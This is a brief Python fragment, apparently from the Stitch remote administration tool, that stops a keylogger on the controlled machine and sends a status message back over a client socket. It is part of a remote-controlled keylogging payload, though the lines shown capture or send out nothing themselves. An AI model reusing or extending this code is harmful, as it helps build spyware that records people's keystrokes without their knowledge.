# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if status := nt_kl.get_status():
    nt_kl.stop()
    status = nt_kl.get_status()
    resp = (
        '[!] Keylogger failed to stop\n'
        if status
        else '[+] Keylogger has been successfully stopped\n'
    )

else:
    resp = '[+] Keylogger is already inactive\n'
send(client_socket,resp)
